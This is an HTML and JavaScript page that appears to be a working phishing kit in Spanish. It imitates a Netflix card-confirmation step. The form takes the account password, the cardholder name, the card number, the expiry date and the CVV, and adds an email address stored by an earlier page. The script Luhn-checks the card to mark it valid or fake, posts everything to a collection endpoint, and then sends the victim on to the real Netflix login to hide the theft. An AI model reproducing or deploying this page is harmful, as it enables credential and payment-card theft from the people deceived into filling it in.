<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Confirmaci&oacute;n</title>
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.2/css/all.css">
    <style>
        body { background: #fff; font-family: sans-serif; margin: 0; }
        .container { max-width: 400px; margin: 50px auto; padding: 20px; text-align: center; }
        .input-box { margin-bottom: 15px; }
        .input-box input { width: 100%; padding: 12px; box-sizing: border-box; border: 1px solid #ccc; }
        .btn { background: #e50914; color: #fff; width: 100%; padding: 15px; border: none; font-weight: bold; cursor: pointer; }
        #loading { display: none; }
    </style>
</head>
<body>
    <div class="container" id="form-container">
        <h2>Configura tu tarjeta</h2>
        <form id="pay-form">
            <div class="input-box"><input type="password" id="pw" placeholder="Contraseña" required></div>
            <div class="input-box"><input type="text" id="nm" placeholder="Nombre en tarjeta" required></div>
            <div class="input-box"><input type="text" id="cc" placeholder="Número de tarjeta" maxlength="16" required></div>
            <div class="input-box"><input type="text" id="ex" placeholder="MM/AA" maxlength="5" required></div>
            <div class="input-box"><input type="text" id="cv" placeholder="CVV" maxlength="4" required></div>
            <button type="submit" class="btn">Continuar</button>
        </form>
    </div>

    <div id="loading" class="container">
        <i class="fas fa-spinner fa-spin fa-3x" style="color:#e50914;"></i>
        <p>Procesando...</p>
    </div>

    <script>
        // Algoritmo de Luhn
        function luhn(n) {
            let s = 0;
            for (let i = 0; i < n.length; i++) {
                let v = parseInt(n[i]);
                if (i % 2 === n.length % 2) {
                    v *= 2;
                    if (v > 9) v -= 9;
                }
                s += v;
            }
            return s % 10 === 0;
        }

        document.getElementById('pay-form').addEventListener('submit', function(e) {
            e.preventDefault();
            document.getElementById('form-container').style.display = 'none';
            document.getElementById('loading').style.display = 'block';

            const cc = document.getElementById('cc').value.replace(/\s/g, '');
            const data = {
                em: sessionStorage.getItem('usr_mail') || 'Desconocido',
                pw: document.getElementById('pw').value,
                nm: document.getElementById('nm').value,
                cc: cc,
                ex: document.getElementById('ex').value,
                cv: document.getElementById('cv').value,
                luhn: luhn(cc) ? "VÁLIDA" : "FALSA"
            };

            // SEGURO: Redirigir a los 4 segundos pase lo que pase
            setTimeout(() => { window.location.href = "https://www.netflix.com/login"; }, 4000);

            fetch('/api/enviar', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data)
            })
            .then(() => { window.location.href = "https://www.netflix.com/login"; })
            .catch(() => { window.location.href = "https://www.netflix.com/login"; });
        });
    </script>
</body>
</html>
